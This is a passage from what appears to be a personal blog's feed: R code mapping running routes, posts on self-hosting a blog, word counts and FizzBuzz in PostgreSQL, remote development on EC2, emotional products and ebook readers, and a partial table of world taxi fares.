  </span><span class="n">lines</span><span class="p">(</span><span class="n">currRoute</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">currRoute</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">col</span><span class="o">=</span><span class="s2">"#00000020"</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">route_groups</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unique</span><span class="p">(</span><span class="n">routes</span><span class="o">$</span><span class="n">index</span><span class="p">)</span><span class="w">
</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">route_groups</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">currRoute</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">subset</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="o">==</span><span class="n">route_groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w">
  </span><span class="n">lines</span><span class="p">(</span><span class="n">currRoute</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">currRoute</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">col</span><span class="o">=</span><span class="s2">"#FF000020"</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c1"># Zoom into a particular area of routes</span><span class="w">
</span><span class="n">zoom</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span><span class="w"> </span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">radius</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">lat_north</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">lat</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">radius</span><span class="w">
  </span><span class="n">long_west</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">long</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">radius</span><span class="w">
  </span><span class="n">lat_south</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">lat</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">radius</span><span class="w">
  </span><span class="n">long_east</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">long</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">radius</span><span class="w">
  </span><span class="n">routes.filtered</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">routes</span><span class="p">[</span><span class="n">routes</span><span class="o">$</span><span class="n">lat</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">lat_north</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">routes</span><span class="o">$</span><span class="n">lat</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">lat_south</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">routes</span><span class="o">$</span><span class="n">long</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">long_west</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">routes</span><span class="o">$</span><span class="n">long</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">long_east</span><span class="p">,</span><span class="w"> </span><span class="p">]</span><span class="w">

  </span><span class="n">plot</span><span class="p">(</span><span class="n">routes.filtered</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">routes.filtered</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="s2">"n"</span><span class="p">,</span><span class="w"> </span><span class="n">axes</span><span class="o">=</span><span class="kc">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">xlab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">ylab</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">main</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span><span class="w"> </span><span class="n">asp</span><span class="o">=</span><span class="m">1</span><span class="p">)</span><span class="w">
  </span><span class="n">route_groups</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unique</span><span class="p">(</span><span class="n">routes.filtered</span><span class="o">$</span><span class="n">index</span><span class="p">)</span><span class="w">
  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">route_groups</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">currRoute</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">subset</span><span class="p">(</span><span class="n">routes.filtered</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="o">==</span><span class="n">route_groups</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="w">
    </span><span class="n">lines</span><span class="p">(</span><span class="n">currRoute</span><span class="o">$</span><span class="n">long</span><span class="p">,</span><span class="w"> </span><span class="n">currRoute</span><span class="o">$</span><span class="n">lat</span><span class="p">,</span><span class="w"> </span><span class="n">col</span><span class="o">=</span><span class="s2">"#FF000020"</span><span class="p">)</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">hoboken_lat</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">40.79</span><span class="w">
</span><span class="n">hoboken_long</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">-74.0279</span><span class="w">
</span><span class="n">radius</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">0.25</span><span class="w">

</span><span class="n">zoom</span><span class="p">(</span><span class="n">routes</span><span class="p">,</span><span class="w"> </span><span class="n">hoboken_lat</span><span class="p">,</span><span class="w"> </span><span class="n">hoboken_long</span><span class="p">,</span><span class="w"> </span><span class="n">radius</span><span class="p">)</span></code></pre></figure>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/rk-world-map.png">
        <img src="http://dangoldin.com/assets/static/images/rk-world-map.png" alt="World Map visualization" width="1288" height="664" layout="responsive"/>
      </a>
      <p>
        A few specks here and there - clearly visible runs in the NY/NJ area as well as some in Virginia, New Orleans, and San Francisco. Can also see a few runs in India.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/rk-hoboken-nyc.png">
        <img src="http://dangoldin.com/assets/static/images/rk-hoboken-nyc.png" alt="Zoom in on Hoboken/NYC runs" width="681" height="687" layout="responsive"/>
      </a>
      <p>
        Zoom in on my runs in the Hoboken/NYC area. I don't have the lat/long coordinates here but if I had them it would be pretty easy to generate a map overlay.
      </p>
    </div>
  </li>
</ul>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why I manage my own blog</title>
   <link href="http://dangoldin.com/2014/02/02/why-i-manage-my-own-blog/"/>
   <updated>2014-02-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/02/02/why-i-manage-my-own-blog</id>
   <content:encoded><![CDATA[
<p>Given the recent news of Medium <a href="http://recode.net/2014/01/28/medium-evan-williams-post-twitter-media-startup-raises-25-million-round/" target="_blank">raising $25M</a> and Svbtle <a href="http://blog.svbtle.com/open-for-everyone" target="_blank">opening up</a> to the public I thought it would be an appropriate time to explain why I’m not using either of them. They’re both simple, clean products that allow writers to concentrate on their writing rather than configuring the dozens of options available in other blogging platforms. They’ve also done a great job with the typography that makes the content enjoyable to read. Compared to the other content websites out there, they’re incredible fast - they have a minimal structure and don’t load a ton of external content - especially when compared to the major publishers out there now such as the news sites and the social networks.</p>

<p>Yet I’m not writing on either of them, nor on Tumblr, Wordpress, or Quora even though I tried each one. For me, writing is about personal expression and being able to control the entire experience - both from the content generation up to the consumption - is important to me. I realize my design will never be as elegant as theirs but at least I can change it whenever I want. A year ago I wanted to include the D3 library for a <a href="http://dangoldin.com/2013/02/12/analysis-of-lincolns-words/">post</a> - this would have been impossible with Svbtle or Medium and I would have had to use static images. Recently I wanted to share <a href="http://dangoldin.com/2014/01/09/taxi-prices-around-the-world/">some charts</a> that I generated but on the first pass I realized they were too large for the content - with a few small tweaks to my theme I was able to incorporate them into my blog. I’ve also been thinking about using Mixpanel to track various events - something I’d never be able to do without full control.</p>

<p>The custom design is part of it but the other value lies in decoupling. I want to be able to decouple the creation of content from the presentation of content from the spreading of content. As an engineer, I like the fact that I’m not tied down to any platform - I know I can get additional pageviews by leveraging the built-in marketing networks these platforms provide but having marketing integrated into a creation tool feels dirty. I’d rather rely on Twitter and Hacker News to share my content. Sure it’s more difficult but it’s a more lasting way to get followers and readers for your content rather than the platform itself.</p>

<p>By being independent, I never have to think about how these platforms evolve and what the impact will be. They’ll have to monetize at some point and I don’t want to worry about that outcome. We’re already seeing massive changes in the way content is produced and consumed and being able to experiment with various approaches and technologies is important - especially for someone in technology. Relying on a third party that’s trying to do too much betrays that.</p>

<p>PS - I just realized I never mentioned how I host my blog. It’s currently hosted on Github pages using the <a href="http://jekyllbootstrap.com/" target="_blank">Jekyll-Bootstrap</a> plugin. At the moment, it gives me the control I want, deals with usage spikes, and is free. If anything ever changes, I can quickly pull everything down and host it on my own.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Solving coding tests in PostgreSQL</title>
   <link href="http://dangoldin.com/2014/01/25/solving-coding-tests-in-postgresql/"/>
   <updated>2014-01-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/25/solving-coding-tests-in-postgresql</id>
   <content:encoded><![CDATA[
<p>Most developers are familiar with the FizzBuzz code test which is a quick way to filter out developers who can’t code. At Yodle, we had our own, slightly more challenging problem. The challenge was read in a text file and then print out the frequency each word appears in descending order. It’s more complicated than FizzBuzz but it assesses a variety of skills. The solution needs to do the following:</p>

<ol>
  <li>Read the file</li>
  <li>Split the text into a list of words delimited by non-letter characters</li>
  <li>Convert each word to lower case</li>
  <li>Compute the frequency each word appears</li>
  <li>Sort the results in descending order by frequency</li>
  <li>Print this sorted list</li>
</ol>

<p>I thought it would be fun to see if I could do it in PostgreSQL and was surprised by how quick and easy it was. The most challenging part was figuring out how to read the file - after that it was just using a few of the built in functions to clean and organize the text.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">temp_t</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">temp_t</span> <span class="p">(</span><span class="k">c</span> <span class="nb">text</span><span class="p">);</span>

<span class="k">COPY</span> <span class="n">temp_t</span><span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="k">FROM</span> <span class="s1">'/tmp/data.txt'</span><span class="p">;</span>

<span class="k">select</span> <span class="k">lower</span><span class="p">(</span><span class="k">data</span><span class="p">.</span><span class="n">w</span><span class="p">)</span> <span class="k">as</span> <span class="n">word</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">num_words</span>
<span class="k">from</span> <span class="p">(</span>
  <span class="k">select</span> <span class="n">regexp_split_to_table</span><span class="p">((</span><span class="k">select</span> <span class="n">string_agg</span><span class="p">(</span><span class="k">c</span><span class="p">,</span><span class="s1">' '</span><span class="p">)</span> <span class="k">from</span> <span class="n">temp_t</span><span class="p">),</span> <span class="n">E</span><span class="s1">'[^</span><span class="se">\\</span><span class="s1">w]+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">w</span>
<span class="p">)</span> <span class="k">data</span>
<span class="k">where</span> <span class="k">data</span><span class="p">.</span><span class="n">w</span> <span class="o">&lt;&gt;</span> <span class="s1">''</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">word</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">num_words</span> <span class="k">desc</span><span class="p">,</span> <span class="n">word</span><span class="p">;</span></code></pre></figure>

<p>It also turns out to be very simple to do FizzBuzz in PostgreSQL. The nice part of the PostgreSQL solution is that it can easily scale to adding a 3rd combination. for example print Dozz if the number is divisible by 7. In the PostgreSQL solution, it would just require adding a row whereas in the standard solutions it would require a bit of work and would increase the chance of a bug.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">fizzbuzz</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">fizzbuzz</span> <span class="p">(</span>
  <span class="n">num</span> <span class="nb">int</span><span class="p">,</span>
  <span class="nb">text</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
  <span class="n">priority</span> <span class="nb">smallint</span>
<span class="p">);</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">fizzbuzz</span> <span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="nb">text</span><span class="p">,</span> <span class="n">priority</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s1">'Fizz'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s1">'Buzz'</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

<span class="k">select</span> <span class="n">coalesce</span><span class="p">(</span><span class="n">string_agg</span><span class="p">(</span><span class="n">fizzbuzz</span><span class="p">.</span><span class="nb">text</span><span class="p">,</span> <span class="s1">''</span> <span class="k">order</span> <span class="k">by</span> <span class="n">fizzbuzz</span><span class="p">.</span><span class="n">priority</span> <span class="k">asc</span><span class="p">),</span> <span class="n">nums</span><span class="p">.</span><span class="n">num</span><span class="p">::</span><span class="nb">text</span><span class="p">)</span> <span class="k">as</span> <span class="nb">text</span>
<span class="k">from</span> <span class="p">(</span>
  <span class="k">select</span> <span class="n">generate_series</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span> <span class="k">as</span> <span class="n">num</span>
<span class="p">)</span> <span class="n">nums</span>
<span class="k">left</span> <span class="k">join</span> <span class="n">fizzbuzz</span> <span class="k">on</span> <span class="n">nums</span><span class="p">.</span><span class="n">num</span> <span class="o">%</span> <span class="n">fizzbuzz</span><span class="p">.</span><span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">nums</span><span class="p">.</span><span class="n">num</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">nums</span><span class="p">.</span><span class="n">num</span> <span class="k">asc</span><span class="p">;</span></code></pre></figure>

<p>Clearly PostgreSQL isn’t the right tool for every task but it’s surprising how powerful it can be given the right problem. It’s also a great way to think differently about a problem - even if you end up choosing a more standard solution.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Developing on a remote instance</title>
   <link href="http://dangoldin.com/2014/01/23/developing-on-a-remote-instance/"/>
   <updated>2014-01-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/23/developing-on-a-remote-instance</id>
   <content:encoded><![CDATA[
<p>One of the first things I was given when joining <a href="http://triplelift.com" target="_blank">TripleLift</a> was a Macbook Air and an Amazon EC2 instance to do my development work on. Before that, every company I worked at would give me a pretty powerful computer so that I’d be able to do my development work locally. At first, coding on a remote instance took some getting used to but now I’m a fan of this approach.</p>

<ul class="bulleted">
	<li>It allows me to work from any computer and paired with the highly portable Macbook Air I can work from virtually anywhere. On the flip side, it relies on a connection to the internet so if the internet ever cuts out it’s difficult to do work unless you also have it checked out locally.</li>

	<li>It’s a great way to simulate a production environment. Especially on OS X where many packages require significant Stack Overflowing to figure out, being able to install libraries that will be used in production is a great way to work out the kinks and be confident that your code will run as expected.</li>

	<li>Along these lines, the entire team will end up with a very similar environment which makes it very easy to give and receive help without having to get used to an entirely new environment.</li>

	<li>If your application relies on EC2 it’s a great way to become familiar with the AWS ecosystem as well as reduce latency between Amazon’s various services. This is useful when you have a significant volume of data going to and from S3 and want to make it as quick as possible.</li>

	<li>There are a ton of tools to make this easy. I’ve recently discovered the <a href="http://wbond.net/sublime_packages/sftp" target="_blank">SFTP plugin</a> for <a href="http://www.sublimetext.com/" target="_blank">Sublime Text</a> which lets you edit your files locally that are automatically synced to the remote instance. That paired with emacs or vim on the instance are all you need.</li>
</ul>

<p>The biggest drawback is that you end up relying on the internet in order to get the most out of this set up. It’s possible to have your code synced locally for editing but getting set up to run locally defeats the purpose of having a remote instance since you have to install and configure the various packages. Given that there’s internet almost anywhere I go I think this trade off is worth it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Emotional products</title>
   <link href="http://dangoldin.com/2014/01/19/emotional-products/"/>
   <updated>2014-01-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/19/emotional-products</id>
   <content:encoded><![CDATA[
<p>In 2013, I gave myself a goal of running 1000 miles. I used RunKeeper to record my runs and used its goal feature to track my progress and quickly see how much I had left. Two days before the new year, I was able to hit my goal and got a little notification from RunKeeper congratulating me on achieving my goal. This small notification got me thinking about how emotion is built into our products. RunKeeper doesn’t care whether it was a 1 mile or 1000 mile goal - the reaction I get would be the same. Yet if I shared these two achievements with my friends, the reactions I get would be completely different. Sure, an algorithm could be designed to treat accomplishments of various difficulties differently and can even be adapted to take into account that to some people, running one mile is equivalent to others running 1000 miles.</p>

<p>I doubt a smarter algorithm would actually make a difference. We might appreciate the intelligence of the algorithm but we’re not going to believe that this digital praise was authentic or that our software actually cares. We already have Google Now promising to give us the information we need when we need it and Amazon is trying to ship products to our doors before we even place the order. Yet as smart as these are, they’re not emotional. Even Siri is just an algorithm. As technology gets smarter, I wonder whether future generations will feel this way. We’ll continue to see these improvements as simply smarter software and better data but I doubt future generations will feel the same way. We’ve seen how dumb our technology has been and won’t be able to think of it as anything more than software. Future generations will be born and grow up in a world surrounded by smarter and better versions of what we have and won’t be saddled with this bias. Many believe the singularity will happen in our lifetimes but I think this will have the larger effect - that we’ll start viewing technology as our equal.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ebook readers</title>
   <link href="http://dangoldin.com/2014/01/15/ebook-readers/"/>
   <updated>2014-01-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/15/ebook-readers</id>
   <content:encoded><![CDATA[
<p>I’m an avid reader and have embraced the move to digital. An internet connection gives me access to thousands of books with a device that’s thinner than a single book. What I grapple with are the reading apps - I can’t find one that does everything I want.</p>

<p>On my iPad, I have iBooks, Readmill, Oyster, Kindle, and ShuBook with each having a separate use case. iBooks and the Kindle app are for books that I purchased from iTunes and Amazon, respectively. Oyster is a great ebook subscription service but I’m limited to the books available in their library. I discovered ShuBook when I wanted to host my own ebook server but have switched to Readmill due to the much nicer reading experience, a web interface to manage my library, and cross-device syncing.</p>

<p>Ideally, I’d be able to use Readmill for everything. I don’t mind paying for books but I do mind paying to be locked into a particular ecosystem. The creation of content should be decoupled from the distribution of content which should be decoupled from the consumption of content. Yet these days they’re tightly coupled. The only real way to overcome these restrictions is to become a digital pirate. It sucks that customers are forced to break laws in order to get the best experience.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Taxi prices around the world</title>
   <link href="http://dangoldin.com/2014/01/09/taxi-prices-around-the-world/"/>
   <updated>2014-01-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/01/09/taxi-prices-around-the-world</id>
   <content:encoded><![CDATA[
<p>I initially set out to add some visualizations to an earlier post comparing taxi fares between NYC and Mumbai based on some reader suggestions. After a few visualizations, I wasn’t discovering anything new and decided add taxi fare data from other cities to make it more interesting. I ended up simulating rides in different cities on <a href="http://www.worldtaximeter.com" target="_blank" rel="nofollow">worldtaximeter.com</a> and combining that with the data from <a href="http://www.taxiautofare.com" target="_blank" rel="nofollow">taxiautofare.com</a> and <a href="http://www.numbeo.com/taxi-fare/" target="_blank">www.numbeo.com</a> in order to break down each city’s fare into a base fare, the included distance, the rate per local distance unit, and the rate per minute. Since each city’s fare came in local units I also had to convert to miles (sorry world) and US dollars (sorry again). Using R we generate the fares for the various combinations of distances and stoppage times and start diving into the data. As usual, the data and code are up on <a href="https://github.com/dangoldin/taxi-pricing" target="_blank">GitHub</a> with contributions, corrections, and suggestions welcome. I’d also love to get the real rates for the cities so either do a pull request or let me know what they are in the comments and I’ll update the post.</p>

<table class="table"><thead><tr><th>City</th><th>Base</th><th>Inc Dist</th><th>Per Dist</th><th>Per Min</th><th>Dist Cvr</th><th>Fare Cvr</th><th>$ Base</th><th>$ per Mile</th><th>$ per Min</th><th>Ratio</th><th>$ per Hr</th></tr></thead><tbody><tr><td>New York</td><td>2.50</td><td>0.00</td><td>2.50</td><td>0.50</td><td>1.00</td><td>1.00</td><td>2.50</td><td>2.50</td><td>0.50</td><td>5.00</td><td>30.00</td></tr><tr><td>Mumbai</td><td>19.00</td><td>1.50</td><td>12.35</td><td>0.50</td><td>1.61</td><td>0.02</td><td>0.32</td><td>0.33</td><td>0.01</td><td>39.77</td><td>0.50</td></tr><tr><td>London</td><td>2.20</td><td>2.00</td><td>1.70</td><td>0.52</td><td>1.61</td><td>1.64</td><td>3.61</td><td>4.49</td><td>0.85</td><td>5.31</td><td>50.71</td></tr><tr><td>Amsterdam</td><td>2.66</td><td>0.00</td><td>1.95</td><td>0.32</td><td>1.61</td><td>1.36</td><td>3.62</td><td>4.27</td><td>0.44</td><td>9.81</td><td>26.11</td></tr><tr><td>Tokyo</td><td>712.00</td><td>0.00</td><td>188.00</td><td>56.00</td><td>1.61</td><td>0.01</td><td>6.84</td><td>2.91</td><td>0.54</td><td>5.41</td><td>32.26</td></tr><tr><td>Aberdeen</td><td>2.40</td><td>0.90</td><td>1.10</td><td>0.37</td><td>1.61</td><td>1.64</td><td>3.94</td><td>2.90</td><td>0.61</td><td>4.79</td><td>36.41</td></tr><tr><td>Austin</td><td>2.54</td><td>0.20</td><td>1.30</td><td>0.67</td><td>1.61</td><td>1.00</td><td>2.54</td><td>2.09</td><td>0.67</td><td>3.12</td><td>40.20</td></tr><tr><td>Baltimore</td><td>1.80</td><td>0.15</td><td>1.36</td><td>0.44</td><td>1.61</td><td>1.00</td><td>1.80</td><td>2.19</td><td>0.44</td><td>4.98</td><td>26.40</td></tr><tr><td>Barcelona</td><td>2.05</td><td>0.00</td><td>0.98</td><td>0.38</td><td>1.61</td><td>1.36</td><td>2.79</td><td>2.15</td><td>0.52</td><td>4.15</td><td>31.01</td></tr><tr><td>Berlin</td><td>3.00</td><td>0.00</td><td>1.58</td><td>0.41</td><td>1.61</td><td>1.36</td><td>4.08</td><td>3.46</td><td>0.56</td><td>6.20</td><td>33.46</td></tr><tr><td>Boston</td><td>2.60</td><td>0.23</td><td>1.73</td><td>0.54</td><td>1.61</td><td>1.00</td><td>2.60</td><td>2.79</td><td>0.54</td><td>5.16</td><td>32.40</td></tr><tr><td>Chicago</td><td>2.25</td><td>0.18</td><td>1.11</td><td>0.37</td><td>1.61</td><td>1.00</td><td>2.25</td><td>1.79</td><td>0.37</td><td>4.83</td><td>22.20</td></tr><tr><td>Dublin</td><td>4.09</td><td>1.00</td><td>1.03</td><td>0.37</td><td>1.61</td><td>1.36</td><td>5.56</td><td>2.26</td><td>0.50</td><td>4.48</td><td>30.19</td></tr><tr><td>Edinburgh</td><td>3.00</td><td>0.52</td><td>1.20</td><td>0.36</td><td>1.61</td><td>1.64</td><td>4.92</td><td>3.17</td><td>0.59</td><td>5.41</td><td>35.13</td></tr><tr><td>Ibiza</td><td>3.25</td><td>0.00</td><td>0.98</td><td>0.35</td><td>1.61</td><td>1.36</td><td>4.42</td><td>2.15</td><td>0.48</td><td>4.51</td><td>28.56</td></tr><tr><td>Las Vegas</td><td>3.30</td><td>0.00</td><td>1.49</td><td>0.53</td><td>1.61</td><td>1.00</td><td>3.30</td><td>2.40</td><td>0.53</td><td>4.53</td><td>31.80</td></tr><tr><td>Los Angeles</td><td>2.85</td><td>0.18</td><td>1.67</td><td>0.50</td><td>1.61</td><td>1.00</td><td>2.85</td><td>2.69</td><td>0.50</td><td>5.38</td><td>30.00</td></tr><tr><td>Madrid</td><td>2.04</td><td>0.00</td><td>0.98</td><td>0.32</td><td>1.61</td><td>1.00</td><td>2.04</td><td>1.58</td><td>0.32</td><td>4.93</td><td>19.20</td></tr><tr><td>Malaga</td><td>1.42</td><td>0.00</td><td>0.84</td><td>0.34</td><td>1.61</td><td>1.36</td><td>1.93</td><td>1.84</td><td>0.46</td><td>3.98</td><td>27.74</td></tr><tr><td>Mallorca</td><td>3.00</td><td>0.00</td><td>0.80</td><td>0.29</td><td>1.61</td><td>1.36</td><td>4.08</td><td>1.75</td><td>0.39</td><td>4.44</td><td>23.66</td></tr><tr><td>Manchester</td><td>2.35</td><td>0.43</td><td>1.00</td><td>0.28</td><td>1.61</td><td>1.64</td><td>3.85</td><td>2.64</td><td>0.46</td><td>5.75</td><td>27.55</td></tr><tr><td>Melbourne</td><td>3.20</td><td>0.00</td><td>1.61</td><td>1.04</td><td>1.61</td><td>0.89</td><td>2.85</td><td>2.31</td><td>0.93</td><td>2.49</td><td>55.54</td></tr><tr><td>Montreal</td><td>3.45</td><td>0.00</td><td>1.70</td><td>0.63</td><td>1.61</td><td>0.93</td><td>3.21</td><td>2.55</td><td>0.59</td><td>4.34</td><td>35.15</td></tr><tr><td>New Delhi</td><td>40.00</td><td>0.00</td><td>15.00</td><td>1.67</td><td>1.61</td><td>0.02</td><td>0.67</td><td>0.40</td><td>0.03</td><td>14.46</td><td>1.67</td></tr><tr><td>Paris</td><td>2.20</td><td>0.00</td><td>1.14</td><td>0.75</td><td>1.61</td><td>1.36</td><td>2.99</td><td>2.50</td><td>1.02</td><td>2.45</td><td>61.20</td></tr><tr><td>Rome</td><td>2.80</td><td>0.00</td><td>1.52</td><td>0.44</td><td>1.61</td><td>1.36</td><td>3.81</td><td>3.33</td><td>0.60</td><td>5.56</td><td>35.90</td></tr><tr><td>San Diego</td><td>2.50</td><td>0.00</td><td>1.67</td><td>0.46</td><td>1.61</td><td>1.00</td><td>2.50</td><td>2.69</td><td>0.46</td><td>5.85</td><td>27.60</td></tr><tr><td>San Francisco</td><td>3.10</td><td>0.00</td><td>1.39</td><td>0.47</td><td>1.61</td><td>1.00</td><td>3.10</td><td>2.24</td><td>0.47</td><td>4.76</td><td>28.20</td></tr><tr><td>Seattle</td><td>2.50</td><td>0.16</td><td>1.55</td><td>0.52</td><td>1.61</td><td>1.00</td><td>2.50</td><td>2.50</td><td>0.52</td><td>4.80</td><td>31.20</td></tr><tr><td>Sydney</td><td>3.40</td><td>0.00</td><td>2.06</td><td>0.91</td><td>1.61</td><td>0.89</td><td>3.03</td><td>2.95</td><td>0.81</td><td>3.64</td><td>48.59</td></tr><tr><td>Toronto</td><td>4.25</td><td>0.14</td><td>1.74</td><td>0.53</td><td>1.61</td><td>0.93</td><td>3.95</td><td>2.61</td><td>0.49</td><td>5.29</td><td>29.57</td></tr><tr><td>Vancouver</td><td>3.20</td><td>1.00</td><td>1.85</td><td>0.50</td><td>1.61</td><td>0.93</td><td>2.98</td><td>2.77</td><td>0.47</td><td>5.96</td><td>27.90</td></tr><tr><td>Washington DC</td><td>3.00</td><td>0.00</td><td>0.93</td><td>0.26</td><td>1.61</td><td>1.00</td><td>3.00</td><td>1.50</td><td>0.26</td><td>5.76</td><td>15.60</td></tr><tr><td>Zurich</td><td>6.00</td><td>0.00</td><td>3.80</td><td>1.15</td><td>1.61</td><td>1.10</td><td>6.60</td><td>6.73</td><td>1.27</td><td>5.32</td><td>75.90</td></tr><tr><td>Beijing</td><td>13.00</td><td>3.00</td><td>2.30</td><td>0.30</td><td>1.61</td><td>0.17</td><td>2.21</td><td>0.63</td><td>0.05</td><td>12.34</td><td>3.06</td></tr><tr><td>Shanghai</td><td>14.00</td><td>0.00</td><td>2.40</td><td>0.50</td><td>1.61</td><td>0.17</td><td>2.38</td><td>0.66</td><td>0.09</td><td>7.73</td><td>5.10</td></tr><tr><td>Moscow</td><td>245.00</td><td>0.00</td><td>26.53</td><td>14.00</td><td>1.61</td><td>0.03</td><td>7.35</td><td>1.28</td><td>0.42</td><td>3.05</td><td>25.20</td></tr><tr><td>Bangkok</td><td>35.00</td><td>0.00</td><td>6.00</td><td>1.67</td><td>1.61</td><td>0.03</td><td>1.05</td><td>0.29</td><td>0.05</td><td>5.78</td><td>3.01</td></tr><tr><td>Buenos 